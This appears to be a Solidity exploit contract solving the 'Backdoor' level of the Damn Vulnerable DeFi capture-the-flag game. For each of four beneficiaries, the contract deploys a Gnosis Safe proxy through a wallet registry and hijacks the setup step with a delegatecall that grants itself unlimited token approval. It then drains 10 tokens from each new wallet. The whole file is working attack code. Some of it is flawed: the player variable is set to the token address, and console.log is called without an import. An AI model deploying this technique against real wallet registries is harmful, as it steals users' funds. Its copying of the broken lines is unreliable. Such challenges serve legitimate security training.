// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "./WalletRegistry.sol";
import "../DamnValuableToken.sol";
contract BackdoorAttacker{
    //GnosisSafeProxy proxy;
    GnosisSafeProxyFactory factory;
    WalletRegistry wr;
    address player;
    GnosisSafe master;
    DamnValuableToken immutable token;
    constructor(address _factory,address _wr,address _player,address payable _master,address _token){
        //proxy = GnosisSafeProxy(_proxy);
        factory = GnosisSafeProxyFactory(_factory);
        wr = WalletRegistry(_wr);
        player = _token;
        master = GnosisSafe(_master);
        token =DamnValuableToken(_token);
        console.log(address(factory));
        console.log(address(wr));
        console.log(address(player));
        console.log(address(master));
        console.log(address(token));
    }
    function attack(address[] calldata _owners) public{
        //console.log(address(token));
        for(uint i = 0;i<4;i++){
            address[] memory owners = new address[](1); 
            owners[0]=_owners[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, 
                owners,
                1,
                address(this),
                abi.encodeWithSelector(BackdoorAttacker.approve.selector, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
                );
            GnosisSafeProxy wallet = factory.createProxyWithCallback{gas:3*1e7}(
                address(master), 
                initializer, 
                0, 
                IProxyCreationCallback(address(wr))
                );
            token.transferFrom(address(wallet), msg.sender, 10 ether);
        }
        

    }
    function approve(address spender) external {
        
        console.log(address(factory));
        console.log(address(wr));
        console.log(address(player));
        console.log(address(master));
        console.log(address(token));
        token.approve(spender, type(uint256).max);
    }
}

